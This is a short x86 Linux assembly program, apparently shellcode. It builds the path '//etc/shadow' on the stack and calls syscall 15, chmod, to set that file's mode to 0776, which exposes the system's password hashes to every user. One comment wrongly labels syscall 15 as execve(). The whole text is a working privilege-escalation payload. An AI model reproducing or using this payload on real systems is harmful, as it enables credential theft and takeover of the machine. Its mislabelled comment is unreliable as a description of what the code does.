global _start
section .text

_start:
	xor eax, eax
	push eax		;NULL

	push 0x776f6461		;adow
	push word 0x6873	;let's split c/sh
	push word 0x2f63
	push word 0x7465	;let's split //et
	push word 0x2f2f			

        mov ebx, esp		;mov pointer to //etc/shadow string into ebx
        mov cx, 0x1fe		;0776 mode
	mov al, 15		;execve() code
        int 0x80		;run syscall

	;we have added exit() code to exit normally without Seg. Fault.
	xor eax, eax
	mov al, 1
	int 0x80
